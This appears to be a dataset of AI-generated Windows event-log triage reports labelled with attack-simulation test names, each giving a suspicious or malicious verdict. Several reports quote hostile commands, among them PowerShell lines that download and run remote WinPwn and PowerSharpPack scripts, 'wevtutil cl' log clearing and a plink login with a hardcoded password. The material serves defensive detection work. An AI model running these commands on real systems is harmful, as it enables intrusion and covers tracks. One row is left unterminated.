The actions observed in the logs, particularly the comprehensive PowerShell command execution and the deliberate clearing of logs, strongly suggest suspicious activity. While not all events individually appear malicious, the combination of actions indicates potential post-compromise behavior aimed at gathering information, orchestrating persistence, or covering tracks.

Given these indicators:

- **Resolution: SUSPICIOUS** - The log entries contain activity that appears suspicious and warrants further investigation. The specific focus should be on the `admin_test` user activity, potential unauthorized access, and any other vectors such as remote access or unusual account activity. Conduct a thorough audit of user access and any recent changes or new accounts.

### Recommended Actions:

1. **Investigate the `admin_test` account** usage and associated logins closely.
2. **Review PowerShell script block logging** if enabled, for deeper visibility into executed scripts.
3. **Inspect for persistence mechanisms**, including scheduled tasks, startup items, and services.
4. **Consider conducting a broader compromise assessment** of `Server002` and any potentially interconnected systems.
5. **Restrict account permissions** if they are found to be excessive or misconfigured.

These steps will help determine whether the system is compromised and need remediation. Further security reviews involving enhanced threat detection and response capabilities should be considered."
System Information Discovery,"Upon reviewing the provided logs, the following analysis has been conducted:

### Suspicious and Anomalous Behavior:

1. **EvtxUtil and Event Logs Clearing:**
   - Multiple entries for `wevtutil.exe` executed by the `admin_test` account with high integrity (indicating elevated privileges) to clear various event logs (Sysmon, Application, System, and Security logs). 
   - The use of `wevtutil` for clearing logs is highly suspicious, especially when multiple logs are cleared in rapid succession. This activity is typically associated with attempts to cover tracks post-compromise.

2. **Potential Process Injection or Unauthorized Use of Hosts:**
   - `HOSTNAME.EXE`, `whoami.exe`, and `cmd.exe` are executed in sequences that suggest reconnaissance activities. The command line for `cmd.exe` running `systeminfo` and `reg query` indicates gathering information about the system environment.

3. **Time Manipulation:**
   - Several log entries note time change events, which may be used to manipulate timestamps on logs or other artifacts on the system.

4. **NTLM Authentication from External Sources:**
   - There is logon activity using NTLM, indicating possible connections from external workstations. It is important to verify if such access patterns are expected.

### Malicious Indicators:

- The clearing of security-related event logs is a definitive indicator of suspicious activity aimed at covering tracks after a possible breach.
- Command execution for reconnaissance without a clear, legitimate business purpose suggests potential pre-attack reconnaissance actions.

### Assessment:

The logs show substantial signs of potentially malicious activity. The behavior of repeatedly clearing the event logs, executing system reconnaissance commands, and making unauthorized time changes all hint towards attempts to evade detection or cover up tracks, potentially post a security incident.

### Resolution: SUSPICIOUS

The evidence suggests suspicious activity that requires further in-depth investigation for the following reasons:
- Clearing event logs (Sysmon, Application, System, Security) without a verified, legitimate reason.
- Commands indicative of system reconnaissance without a legitimate business purpose.
- Potential unauthorized access or misused privileges.

### Guidance on How to Proceed:

1. **Immediate Actions:**
   - Isolate the affected system to prevent further potential damage or propagation.
   - Conduct a containment and forensic analysis to confirm the exact nature and extent of the compromise.
   - Review and secure the `admin_test` account credentials.

2. **Forensic Investigation:**
   - Retrieve and analyze any additional logs (e.g., firewall, intrusion detection/prevention systems) to track anomalous network activity.
   - Verify the integrity and source of software on the affected machine (e.g., check for unauthorized software or modifications).
   - Collect RAM snapshots for analysis to identify any remaining or active malicious code.

3. **Preventative Measures:**
   - Implement monitoring measures to detect similar activities in real-time in the future.
   - Enhance log retention and audit policies to ensure such actions are noticed swiftly in the future.
   - Educate administrative users on secure practices and the importance of not using elevated commands without oversight.

Overall, further analysis is critical to confirm these findings and ensure that any potential compromise is thoroughly investigated and mitigated."
Simulating MAZE Directory Enumeration,"After carefully analyzing the provided logs, I have identified the following suspicious and potentially malicious activities:

### Suspicious Activities
1. **PowerShell Script Execution:**
   - The Windows PowerShell logs indicate the execution of a script that iterates through user directories and system directories such as `ProgramFiles` and `ProgramFiles(x86)`, outputting results to a file named `T1083Test5.txt` in the temp directory. This behavior is indicative of reconnaissance activities often used to list directory contents on disk, which can be related to a technique known in the MITRE ATT&CK framework as ""File and Directory Discovery"" (ID T1083).

2. **Log Clearing Activity:**
   - Multiple instances of log files being cleared are evident, particularly in the Security and System logs. We see `wevtutil.exe` being used to clear logs, which is flagged in the Sysmon logs as executed by the user `SERVER002\admin_test`. This is very suspicious as log clearing is commonly associated with attempts to cover tracks after a system intrusion or malicious actions.

3. **Time Change Events:**
   - Time changes noted in the Security and System logs caused by `svchost.exe`, associated with the LOCAL SERVICE account. Although changing system time itself can have legitimate reasons, it might also be suspicious if correlating with other anomalous activities since attackers sometimes alter timestamps to confuse forensic investigations.

### Indicators of Potential Compromise
- The execution pattern of PowerShell and the precise use of unnamed console window hosts (`conhost.exe`) alongside PowerShell script execution, directory listing, and log clearing aligns with behavior patterns often seen in post-exploitation frameworks (such as C2 frameworks or lateral movement tools).
  
- Since `wevtutil.exe` was used to clear Security, System, and PowerShell logs, it strongly suggests an attempt to hide activity. The use of such a utility by an administrative account without any legitimate task description further reinforces this as potentially malicious.

### Risks and Threats Identified
- Potential data reconnaissance on user directories and program files.
- Concealment of potentially harmful or data extraction-related activities.
- Possibility of privilege escalation or lateral movement preparation.

### Guidance on How to Proceed
- **Immediate Investigation:** Investigate the origin of the PowerShell commands and determine if the script is legitimate.
- **Containment and Monitoring:** Enforce enhanced monitoring, especially around PowerShell activity and log management processes.
- **Threat Intelligence:** Gather more intelligence on endpoints or over the network to determine if these actions correlate with known threat actor TTPs (Tactics, Techniques, and Procedures).

### Resolution
Based on the identified suspicious and potentially malicious activities within the logs, I conclude with a resolution of **MALICIOUS**. Immediate and thorough investigation is warranted to ascertain the full scope of the situation and mitigate any potential threats."
System Service Discovery,"### Detailed Analysis

The provided logs are from different sources - System, Security, Sysmon, and Windows Update - and each log provides various types of event details that help identify any suspicious activity on the host machine.

#### Key Observations:

1. **Log File Clearance:**
   - **Event ID 104 (System Log):** The log files for System, Security, and Windows PowerShell were cleared by the user ""admin_test"" on ""SERVER002"" at 2024-10-20 21:02:16.
   - **Event ID 1102 (Security Log):** Security event logs were cleared at the same time by the same user. Clearing log files is a red flag, as it is an action often taken by malicious actors to cover their tracks.

2. **Unexpected Command Executions:**
   - **Sysmon Logs:** Multiple instances of `wevtutil.exe` are noted (Process Ids: 3024, 776, 5396) indicating the clearing of logs. The use of `wevtutil.exe cl` command to clear logs is suspicious when done multiple times in quick succession, especially by a non-administrative script or unusual context.
   - **Command Line Activities:** 
     - **Process Execution:**
       - `cmd.exe` executed tasks that list processes (`tasklist.exe`) and query services (`sc query`). These commands can be used for reconnaissance by attackers to gather information about the running environment and services.

3. **Credential Access Events:**
   - **Event ID 5379 (Security Log):** Multiple credential access attempts were recorded where access to Microsoft accounts and Windows Live tokens failed with a return code indicating a failure (3221226021 - STATUS_NO_SUCH_USER). This might indicate unsuccessful attempts to gain unauthorized access.

4. **Unusual Integrity Level:**
   - `wevtutil.exe` was executed under a high integrity level by ""admin_test"", which suggests it was executed with administrator privileges, corresponding with the log clearance events.

#### Assessment:

The combination of log file clearance events, unexpected execution of system processes with administrative privileges to clear logs, and failed credential access attempts forms a pattern typically associated with malicious behavior. The specific actions indicate an attempt to both conduct reconnaissance on the system and cover tracks, a common behavior in post-compromise situations.

### Resolution: MALICIOUS

Based on the log analysis, the activities observed are characteristic of a potential security breach aimed at covering tracks and gathering information for further exploitation. The clearance of logs by an account, possibly compromised (""admin_test""), and the attempts to query system information signify malicious intent.

### Recommended Actions:

1. **User Account Review:**
   - Investigate the activity related to the ""admin_test"" account, including recent activities and login history. Determine if the account was compromised or misused.

2. **Incident Response Actions:**
   - Initiate a security incident response process to contain and analyze the compromise.
   - Check for any unauthorized access or modifications, especially related to sensitive data or critical system configurations.
   - Ensure that logging is restored and rigorously reviewed for further anomalous activities.

3. **System Analysis and Cleanup:**
   - Perform a thorough system scan with advanced anti-malware tools to ensure no further malicious entities exist.
   - Consider rebuilding the affected system(s) from a known clean state.

4. **Security Posture Enhancement:**
   - Implement stricter access controls and multi-factor authentication for administrative accounts.
   - Regularly audit logging configurations to detect and alert on events like log clearance or unauthorized access attempts."
Get-EventLog To Enumerate Windows Security Log,"After reviewing the provided logs, there are several indicators and activities that warrant a detailed analysis to understand if there are any signs of potential compromise:

1. **Log Clearing Event**: The logs indicate an event log clearing action with EventID 1102 in the Security logs, executed by the user `admin_test` with the SID `S-1-5-21-3962163828-2803415714-1403596700-1006`. This action is suspicious because it can be indicative of a malicious actor trying to cover their tracks after conducting unauthorized activities. In typical operations, event log clearing should be a rare occurrence and usually only executed under specific, justified circumstances. This aligns with the Windows Security Event 104 in the System log, which shows `admin_test` clearing the System channel event log.

2. **System and PowerShell Activity**: There are multiple PowerShell instances (through Event ID 1 in the Sysmon logs) executing commands that involve file operations and event log retrieval and exporting (e.g., encoded PowerShell commands). Particularly, the command `""powershell.exe"" & {powershell -c {get-eventlog 'Security' | where {$_.Message -like '*SYSTEM*'} | export-csv $env:temp\\T1654_events.txt}}` seems to be collecting security events. This might be legitimate in some administrative contexts but can also be a precursor to log analysis by a threat actor or reconnaissance.

3. **Unexpected Administrative Actions**: The clearing of Windows Event logs via `wevtutil.exe` is seen frequently, and this action took place multiple times across different logs (Security, Sysmon, System, and PowerShell). This could be part of a normal administrative task, but in combination with the manual log export and event log clearing, it is more suspicious.

4. **Repeated Credential Attempts**: Anomalous events such as EventID 5379 in Security logs show repeated failures or accesses to Microsoft accounts (e.g., `MicrosoftAccount:user=02txoixylodcstop`) without successful credential retrieval, with indications of unsuccessful access attempts. While failed access attempts are not immediately dangerous, when combined with the other data points, they add to the overall suspicious picture.

5. **Privilege Usage**: EventID 4672 events show special privileges being assigned, which could be relevant if viewed alongside unauthorized or unexpected activities. However, from the details, it appears associated with standard tasks related to system processes.

**Assessment and Next Steps**:
- **Resolution**: **SUSPICIOUS** - The combination of cleared logs, PowerShell activities, and accessing desired credentials suggests activities that need further investigation. Standing alone, these may have benign explanations, but the combination cannot be ignored.

Given these findings, it would be prudent to:
- Conduct a deeper forensic investigation into the actions taken by user `admin_test`, who was responsible for clearing logs and executing these PowerShell commands.
- Investigate any unauthorized access, privilege escalation attempts, or network connections initiated around these timeframes.
- Review if there are similar timestamps across other systems which might suggest lateral movement.
- Increase monitoring on `Server002` and similar activities across your network to catch potential further incidents.
- Ensure endpoint protection measures are in place and logs are monitored to detect further possible suspicious activities.

Always cross-reference with operational knowledge about legitimate administrative activities logged at that time, and collaborate with your IT operations to gather context around these entries."
Enumerate all accounts via PowerShell (Local),"### Detailed Analysis of the Logs:

#### Overview
The logs provided contain various events from the System, Security, Sysmon, PowerShell, and Application logs of a Windows host. Key identifiers in the logs should be examined to detect any anomalous or potentially malicious behavior.

#### Indicators of Suspicious Activity
- **Clearing Event Logs:**
  - The `wevtutil.exe cl` command has been executed several times to clear the System, Security, and PowerShell event logs. This action is often associated with attempts to obfuscate activities by removing evidence from the logs.
  - The events with `EventID 104` in the System log and `EventID 1102` in the Security log indicate that log files have been cleared, which is a significant indicator of malicious intent or activity.

- **Execution of Suspicious PowerShell Commands:**
  - There are entries in the Sysmon and PowerShell logs showing PowerShell commands that query user accounts and groups, list files and directories, and invoke `cmdkey.exe /list`, which could potentially be used to discover saved credentials.
  - The command line: `powershell.exe & {net user, get-localuser, get-localgroupmember -group Users, cmdkey.exe /list, ...}` indicates reconnaissance and potentially credential harvesting activities, which are common in lateral movement and privilege escalation phases of an attack.

- **Time Change Events:**
  - The `Microsoft-Windows-Kernel-General (EventID 1)` shows changes in system time, which is a known tactic to evade detection by manipulating timestamps.
  - The `Microsoft-Windows-Security-Auditing (EventID 4616)` security event for time changes supports the above observation.

#### Indicators of Legitimate Activity
- **Microsoft Edge Update:**
  - There are numerous Sysmon entries related to Microsoft EdgeUpdate and EdgeUpdateSetup processes. Although there is no evidence of these processes as malicious, the volume and variations in processes could be manipulated by an attacker in an advanced threat scenario for persistence or evasion.

- **General System Services:**
  - Events related to standard Windows services such as `sppsvc.exe` (Software Protection Platform Service) and Windows Update processes are typically expected and do not indicate unusual activity by themselves.

#### Assessment of the Situation
Given the presence of critical indicators like log clearance, the execution of suspicious and complex PowerShell commands that involve credential enumeration, and system time tampering, there is a high likelihood of malicious behavior occurring on the host system.

#### Identified Threats/Risks
- **Possible Indicators of Compromise (IOC):**
  - Clearing of event logs.
  - Execution of PowerShell scripts indicating reconnaissance for lateral movement.
  - Time alteration events might indicate evasion techniques.

#### Guidance on How to Proceed
- **Immediate Actions:**
  - Isolate the host from the network to prevent further lateral movement.
  - Conduct a full forensic investigation on the system, including memory analysis and file system audit.
  - Inspect other connected systems for similar IOCs as part of network-wide detection.

- **Further Investigation:**
  - Consider threat intelligence checks to match observed behaviors with known threat actor tactics.
  - Check for persistence mechanisms that might not have been covered by the analysis of these logs.

### Resolution:
- **MALICIOUS:** The combination of log, time alteration, and PowerShell activities strongly indicates malicious activity. Immediate investigation and containment actions are recommended."
Azure - Dump Subscription Data with MicroBurst,"After analyzing the provided Windows event logs, I have identified several indicators of potentially malicious activity that warrant further investigation. Here is a detailed analysis of the suspicious activities found in the logs:

1. **Clearing Event Logs**:
   - Event ID 104 in the System log indicates that the event logs for the System and Windows PowerShell channels were cleared by the user `admin_test`. This activity is suspicious because clearing logs is often a tactic used by malicious actors to cover their tracks.
   - In the Security log, Event ID 1102 shows that the same user cleared the Security event log, further indicating an attempt to remove evidence of malicious activity.

2. **PowerShell Usage**:
   - Multiple entries in the Windows PowerShell and Sysmon logs show the execution of PowerShell scripts, including potentially harmful ones. Notably, the script ""Get-AzDomainInfo.ps1"" located in a temporary directory is executed, which might be a part of malicious activity designed to gather domain information without authorization.
   - The command lines in some PowerShell events indicate the use of encoded command flags, which is a known technique used to obfuscate malicious commands in PowerShell attacks.

3. **Use of High Integrity Processes**:
   - The logs show that `wevtutil.exe` was used to clear event logs, a tool that requires high-level privileges to execute such operations. This correlates with entries that show the execution of processes at a High Integrity level by the `admin_test` user.
   - Additionally, there are entries involving processes such as `compatTelRunner.exe`, which is typically used for telemetry and might have been used for surveillance activities or to exploit telemetry capabilities.

4. **Inappropriate or Unauthorized Data Collection**:
   - The `csc.exe` and `cvtres.exe` processes under the context of PowerShell indicate compilation operations, typically suspicious if found outside a development environment, suggesting that the attacker might be using custom scripts or tools dynamically generated in the environment.
   
Given these observations, the logs suggest indicators of compromise, such as clearing event logs and suspicious PowerShell activity. The pattern of cleared logs, privilege use to execute system processes, and potentially sensitive domain information gathering could indicate a security breach.

**Recommendation**: The presence of these events requires immediate investigation. Steps should include:
- Conducting a thorough investigation of the `admin_test` account activity.
- Reviewing user permissions and recent changes to administrative permissions on the system.
- Checking for unauthorized software or script files in the system, particularly in temporary directories.
- Implementing additional monitoring and alerts for PowerShell activity and log clearing on the server.

**Resolution:** SUSPICIOUS - The activity observed in the logs raises several red flags that suggest potentially malicious behavior. Further investigation is needed to confirm the nature of these activities and to mitigate any potential compromise."
WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors,"**Detailed Analysis**

1. **Initial Observations**:
   - The logs indicate familiar operating system activities like Microsoft Edge updates, system time adjustments, and the usage of system utilities like `wevtutil.exe` and `hostname.exe`. These actions by themselves aren't inherently suspicious without specific contexts or deviations.

2. **Suspicious Activity**:
   - **PowerShell Execution**: Logs indicate the execution of a PowerShell command which leverages the command `iex(new-object net.webclient).downloadstring` to fetch and execute scripts from an external URL (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1`). This execution falls under a PowerShell event with a specific command to invoke an audit, which is a known reconnaissance or exploitation action often utilized in post-exploitation phases.
   - **Event Log Clearing**: The logs show `wevtutil.exe` being used with the command line `cl`, which stands for ""clear log.” This utility was executed multiple times targeting the `Microsoft-Windows-Sysmon/Operational`, `Application`, and `Security` channels. Clearing logs is a common tactic to cover tracks post-compromise.
   
3. **Definite Malicious Indicators**:
   - Use of a network-based PowerShell script execution is highly suspicious as it indicates potential download and launch of malicious scripts, especially scripts pulled from non-standard internal repositories.
   - Log clearing, especially for security and operational logs, is typically done to erase traces of malicious activities. 

4. **Associated Risk & Threat**:
   - Potential execution of a malicious payload or information-gathering script through PowerShell.
   - Significant actions have been taken to obfuscate logs and delete traces, indicating a level of stealth associated with advanced persistent threats.

**Resolution**:
- **MALICIOUS**: The logs definitively indicate malicious activity characterized by unauthorized command execution over PowerShell aimed at downloading and running scripts, coupled with log clearing activities to mask such actions.

**Guidance on How to Proceed**:
- Immediately isolate the affected host to prevent further exploitation or lateral movement in the network.
- Conduct a forensic investigation to recover the cleared logs and identify additional Indicators Of Compromise (IOCs).
- Increase monitoring and logging of PowerShell activities, enforce strict network rules to limit unapproved outbound connections, and employ additional PowerShell logging.
- Review and strengthen incident response procedures to better identify and address similar activities promptly in the future.
- Consider re-imaging affected systems and restoring from a known clean backup, ensuring all credentials, especially privileged ones, are reset."
Enumerate logged on users via CMD (Domain),"Based on the detailed analysis of the provided Windows event logs, the following observations were made:

1. **Cleared Event Logs:** 
   - Multiple event log clearings occurred around the same timestamp:
     - Event logs for ""System,"" ""Windows PowerShell,"" and ""Security"" channels were cleared by the user ""admin_test"" on ""SERVER002"".
     - Log clearing actions typically indicate an attempt to hide malicious activity or unauthorized actions.

2. **Use of `wevtutil.exe`:**
   - The `wevtutil.exe` utility was executed multiple times with the clear log command (`cl`) targeting different logs such as System, Security, and Windows PowerShell.
   - It was executed under the user ""admin_test"", which was associated with high integrity levels, indicating elevated permissions.

3. **Process Activities:**
   - Execution of console processes like `conhost.exe` linked as a child of `wevtutil.exe` indicates command-line utility usage which is typical during script-based activities.
   - Utilization of `cmd.exe` with the command `query user /SERVER:%COMPUTERNAME%` indicates monitoring or information-gathering activities by ""admin_test"".

4. **Network Time Protocol (NTP) Changes:**
   - A slight adjustment was made to the system time, though without a detailed analysis of the context, this might not be particularly suspicious but could align with attempts to alter timestamps for log events.

5. **Execution of Administrative Scripts and Tools:**
   - Processes like `whoami.exe`, `hostname.exe`, and `cmd.exe` executed around the time logs were cleared may signify probing or system information gathering consistent with malicious reconnaissance or pre-attack steps.
  
Given the above points:
- **Cleared event logs** are a strong indicator of an attempt to conceal actions, which is usually tied to malicious activity.
- Repeated usage of `wevtutil.exe` for log clearing by a specific user (""admin_test"") combined with high integrity levels and associated utility executions (like `cmd.exe`) aligns with behaviors often associated with malicious intent.

**Conclusion:**

- **Resolution: MALICIOUS.**
  - The combination of log clearing and tool usage, alongside attempted concealment of activities, indicates the presence of malicious activity. Immediate action such as isolating the affected machine, conducting a full forensic analysis, reviewing user permissions, and resetting affected user credentials is recommended to mitigate potential threats."
WMIObject Group Discovery,"Upon reviewing the provided logs, several indicators suggest potential malicious activity or, at the very least, activity that warrants further investigation:

1. **Clearing of Event Logs:**
   - The System, Windows PowerShell, and Security event logs were cleared by user ""admin_test"" within a very short time frame (`2024-10-23 12:57:42`). This is suspicious behavior typical of someone trying to cover their tracks after conducting potentially unauthorized actions.
   - Events related to `wevtutil.exe` are present in the Sysmon log, showing the clearing of logs. This utility is often used to clear event logs.

2. **Command Execution via PowerShell:**
   - PowerShell was used with a command involving `Get-WMIObject Win32_Group`. While this command itself isn't inherently malicious, the use of PowerShell in conjunction with other suspicious activities (such as log clearing) could suggest misuse or privilege reconnaissance.

3. **Sysmon Logs:**
   - There are numerous instances of `whoami.exe` and `hostname.exe` being executed, as well as frequent calls to `conhost.exe`. These can be related to checking user context and system information—normal operations in some contexts but concerning when combined with log tampering.

4. **Security Privileges:**
   - The user `admin_test` was granted several high privileges (`SeSecurityPrivilege`, `SeBackupPrivilege`, `SeDebugPrivilege`, etc.), which could enable extensive access and control over the system, potentially contributing to the capability to clear logs and execute arbitrary commands.

5. **High Integrity Level:**
   - Many of the actions, particularly those related to `conhost.exe` and `wevtutil.exe`, are executed with a high integrity level, implying administrative privileges.

**Assessment:**
The combination of log clearing, PowerShell usage, privilege escalation, and execution of multiple administrative commands, along with high privileges granted to a user, are all indicative of potentially malicious activity. This activity appears to be deliberate and designed to avoid detection and obscure user actions.

**Resolution:**
- **MALICIOUS**: The logs contain activity that strongly suggests malicious intent, particularly given the systematic clearing of crucial event logs and the use of administrative commands. Immediate action is necessary, including potentially isolating the affected host, conducting a detailed forensic analysis, and reviewing the broader network for signs of similar activity.

**Guidance on How to Proceed:**
1. **Isolate the Host:** To prevent further potential damage or lateral movement within the network, isolate the affected server.
2. **Conduct a Detailed Forensic Analysis:** Examine the server in more depth, including memory analysis and comparison of file hashes with known good states or reputable databases.
3. **Audit Active User Accounts:** Verify the legitimacy and recent activity of all privileged user accounts, particularly `admin_test`.
4. **Check for Related Indicators:** Review network logs and any available endpoint detection solutions for similar activity across other systems.
5. **Implement Additional Security Controls:** Consider enhancements in logging, monitoring, and security policy configurations to better detect and manage administrative actions."
Security Software Discovery - Windows Defender Enumeration,"After the detailed analysis of the Windows event logs provided, the following observations and assessments can be made:

### Powershell Logs
- **Registry, Alias, Environment, FileSystem, Function, Variable Providers:**
  - Numerous logs indicate the starting of various PowerShell providers. The commands executed within PowerShell mainly relate to checking the status and configuration of Windows Defender with `Get-Service WinDefend`, `Get-MpComputerStatus`, and `Get-MpThreat`. These commands themselves are not inherently malicious, as they are typically used by system administrators to query security status. However, the use of PowerShell could potentially indicate reconnaissance if performed by an unauthorized user.

### System Logs
- **Log File Cleared Events:**
  - The logs show that system, PowerShell, and security logs were cleared by the user `admin_test` in close succession. This is an unusual activity and often serves as a tactic used by attackers to cover their tracks after conducting unauthorized activities. Clearing logs could be considered suspicious behavior.

### Security Logs
- **Time Change Event (4616):**
  - Multiple entries show a system time change (`EventID 4616`). Time changes can be legitimate due to updates or synchronization with time servers. However, unauthorized changes to system time can be used to manipulate timestamps of events, which can hinder incident analysis. The involved process is `svchost.exe`, which can be risky if it pertains to unauthorized time changes.

### Sysmon Logs
- **Process Execution:**
  - Several utility processes (e.g., `whoami.exe`, `hostname.exe`) and `wevtutil.exe` are recorded. The presence of `wevtutil.exe` suggests that there may have been attempts to clear event logs (again corroborated by the System logs). Executing `wevtutil.exe` in a manner that clears logs, especially by administrative accounts, can indicate an attempt to hide malicious activities.
  
- **Microsoft Edge Update Processes:**
  - Numerous entries are related to `MicrosoftEdgeUpdate.exe` and related executables, which are benign if related to legitimate software updates from Microsoft.

### Application Logs
- **EdgeUpdate Messages:**
  - Messages indicating the EdgeUpdate service started and stopped could be part of legitimate update processes. No abnormal details noted here.

### Conclusion
Based on the analysis, the clearing of logs, in particular, is a concerning factor as it is often associated with malicious intent to cover tracks. While no explicitly malicious software or unusual executable was identified in the process logs, combined with the log clearing activity, these actions warrant further investigation.

### Assessment
- **Resolution: SUSPICIOUS**
  - The act of clearing logs by `admin_test` is suspicious, especially since this action often accompanies attempts to hide other potentially malicious activities. The associated PowerShell activities, although potentially benign alone, could serve as reconnaissance by an unauthorized user.

### Guidance:
1. **Investigate User Activity:** Determine why the `admin_test` user cleared logs. Verify if this was an authorized or scheduled administrative task.
2. **Review Access Logs:** Verify any remote access that may have been used to execute these activities using credentials of `admin_test`.
3. **Audit Current Security Measures:** Ensure that appropriate logging, monitoring, and alerting mechanisms are in place to detect and prevent unauthorized access attempts in the future.
4. **Forensic Analysis:** Consider deeper analysis of any remaining artifacts that might suggest unauthorized remote access or further attempts to obfuscate actions on the system.

These steps will help clarify whether these actions were benign or part of a broader security incident."
Basic Permission Groups Discovery Windows (Domain),"Upon reviewing the Windows event logs, several suspicious activities have been identified which could indicate malicious activity:

1. **Event Log Clearing:**
   - **Security Log**: EventID 1102 indicates that the security event log has been cleared. This event was initiated by the user ""admin_test"" on ""Server002"". Clearing logs can be indicative of attempting to cover up malicious activities.
   - **System Log and Application Log**: Similarly, EventID 104 in the system log indicates the system and Windows PowerShell logs were cleared by the same user. These actions are highly suspicious and could suggest an attempt to hide unauthorized activities.

2. **Suspicious Process Execution:**
   - **Wevtutil.exe Usage**: There are multiple instances of `wevtutil.exe` being executed with command-line parameters indicating the clearing of various logs: ""cl Microsoft-Windows-Sysmon/Operational"", ""cl Application"", ""cl System"", and ""cl Security"". The execution of `wevtutil.exe` with these parameters by an administrative account can be used for log clearing and is suspicious in nature.
   
3. **Account Enumeration:**
   - The execution of `cmd.exe` with a series of `net` commands:
     - The command `net localgroup`, along with others that query enterprise admins and domain admins group information, were executed. This suggests reconnaissance to gather details on users and administrative groups within the domain, potentially preparing for privilege escalation or lateral movement.

4. **Time Change Events:**
   - Events indicating minor adjustments to the system time could be normal behavior related to time synchronization (events with EventID 4616). However, minor systematic changes should be analyzed further in context with the other findings.

Given these observations, the activities captured in the logs are highly indicative of potentially malicious actions. The clearance of security, application, and system logs is especially concerning as it points towards intentional log tampering, possibly to conceal unauthorised activities on the host.

**Assessment and Guidance:**

- **Resolution**: MALICIOUS

The activities observed involve log clearance and potential reconnaissance with `net` commands, which are typical in unauthorized or malicious activities. Immediate action is required to ensure that further malicious activities do not occur:
- Isolate the affected host to prevent any potential spread of malicious activities.
- Conduct a detailed forensic investigation to determine the extent and impact of the activities, identifying any compromised systems or accounts.
- Review user ""admin_test"" credentials and audit for any other suspicious activities across the network.
- Implement tighter log monitoring and alert mechanisms to detect similar activities in the future."
ESXi - Enumerate VMDKs available on an ESXi Host,"Upon analyzing the provided logs, there are several indicators of potentially malicious activity that stand out, which are summarized below:

1. **Process Execution Patterns**:
   - The logs record multiple instances of the `wevtutil.exe` process, which is utilized to clear event logs, followed immediately by console hosts (`conhost.exe`) and PowerShell instances. Notably:
     - Logs indicate `wevtutil.exe` commands such as `wevtutil.exe cl Security`, `wevtutil.exe cl System`, suggesting that log clearing was performed.
     - `Sysmon` EventID 1 and 5 indicate the creation and termination of processes `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test` with high integrity levels.
     - The command lines executed (`CommandLine`) show operations consistent with attempts to clear logs (e.g., using `wevtutil.exe cl`).

2. **Unusual Command Line Execution**:
   - The logs show the execution of an SSH command using `plink.exe`, a command line utility for network connectivity. The command is executed with the `-ssh -l ""root"" -pw ""pass""`, which looks suspicious as it uses a hardcoded password.
   - These activities are not typical for day-to-day operations of legitimate software and may indicate a lateral movement attempt or exfiltration of data.

3. **Log Clearing**:
   - There are multiple log clearing events:
     - `Security`, `System`, and `Windows PowerShell` logs have been cleared by the `admin_test` account, which is typically an action taken to cover tracks after malicious activities.

4. **Integrity Level**:
   - Most of the processes, including suspicious ones, are executed with a high integrity level, suggesting the commands were run with elevated privileges. This can be indicative of privilege escalation or misuse of administrative rights.

5. **Absence of Expected Legitimate Activity**:
   - Logs do not show any specific user intent for these processes and commands, such as software updates requiring such actions, suggesting that the activities are out of usual routine or operation.

### Assessment:

Given these observations—particularly the combination of log clearing activity, unusual network commands involving credential usage, and elevated privilege process executions—the logs contain strong indicators of malicious activity.

WinPwn - spoolvulnscan,"Based on the provided Windows event logs for investigation, several indicators point to potentially suspicious behavior, suggesting further investigation is necessary:

### Detailed Analysis:

1. **Process Execution with High Integrity Level**:
   - Numerous events show `wevtutil.exe` and `conhost.exe` being executed with high integrity levels under the user `SERVER002\admin_test`. The frequent clearing of logs using `wevtutil.exe` followed by `conhost.exe` instances is noteworthy. Clearing logs is commonly associated with attempts to cover up malicious activity.

2. **Process Log Clearing**:
   - Security log `EventID 1102` indicates that logs have been cleared by the user `admin_test`. Combined with the Sysmon log entries showing `wevtutil.exe` usage to clear event logs, this is a red flag. Log clearing is typically a sign of cleaning traces of malicious activities.

3. **Suspicious PowerShell Use**:
   - A PowerShell process was executed using a script downloaded from an external source (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`). The usage of `iex(new-object net.webclient).downloadstring(...)` is often associated with downloading and executing scripts directly from the internet, which is a typical attack vector for malware delivery or exploitation.

4. **Timestamp Manipulation**:
   - Security log `EventID 4616` suggests that the system time was changed. This action can be part of sophisticated attacks to manipulate timestamps of logs and make forensic investigation more challenging.

5. **Unusual Activity of Legitimate Tools**:
   - While `whoami.exe`, `hostname.exe`, and `svchost.exe` are legitimate Windows tools, their unusual execution contexts (with log clearing occurring around similar times) raises concerns of their use in lateral movement or privilege escalation attempts.

### Assessment:

- **Threats/Risks Identified**:
  - Clearing of security and system logs poses a risk of obscuring malicious activities.
  - Remote script execution via PowerShell could be indicative of a PowerShell-based attack or intrusion.
  - Time manipulation indicates potential tampering to evade detection.

### Guidance:

- **Immediate Actions**:
  1. Isolate the affected host (Server002) from the network to prevent further potential spread of infection.
  2. Conduct a full forensic investigation on the host's disk image and memory to uncover any hidden threats or retroactively analyze logs before they were cleared.
  3. Review any recent changes or configurations applied to user `SERVER002\admin_test` as it seems central to this analysis.
  4. Investigate the source of the PowerShell script and evaluate any compromised accounts or assets due to this script execution.
  5. Reinstate and enhance logging and monitoring solutions to prevent future unauthorized clearing or alteration of logs.

### Conclusion: 
Given the evidence of log manipulation, suspicious PowerShell usage, and timestamp changes indicating potentially malicious behavior, the resolution is:
  
- **Resolution: MALICIOUS**

The detected activities align closely with techniques commonly used in security breaches or malware attacks. Immediate remediation steps are necessary to contain and investigate the extent of the compromise."
Enumerate COM Objects in Registry with Powershell,"After analyzing the provided Windows event logs, several indicators suggest potentially suspicious activity:

1. **Clearing Event Logs**:
   - Multiple instances of event log clearing are evident with event IDs 104 in the System log and 1102 in the Security log. These actions were conducted by the user ""admin_test"" using `wevtutil.exe`, which is often considered an indication of potentially malicious behavior, as clearing logs can be an attempt to cover tracks.

2. **Unusual PowerShell Activity**:
   - The Windows PowerShell log shows complex scripts running with multiple CMDLETs creating registry drives and interacting with CLSID entries in the registry. This is suspicious as it indicates advanced enumeration, possibly related to reconnaissance activity (e.g., T1592 from MITRE ATT&CK).

3. **Sysmon Logs Indicating Log Manipulation**:
   - The logs show several instances of processes like `wevtutil.exe` being used to clear logs (`CommandLine: cl`) for various channels (Sysmon, Application, System, Security, and Windows PowerShell). These actions are often taken preemptively to cover malicious activities.

4. **Privilege Escalations Events**:
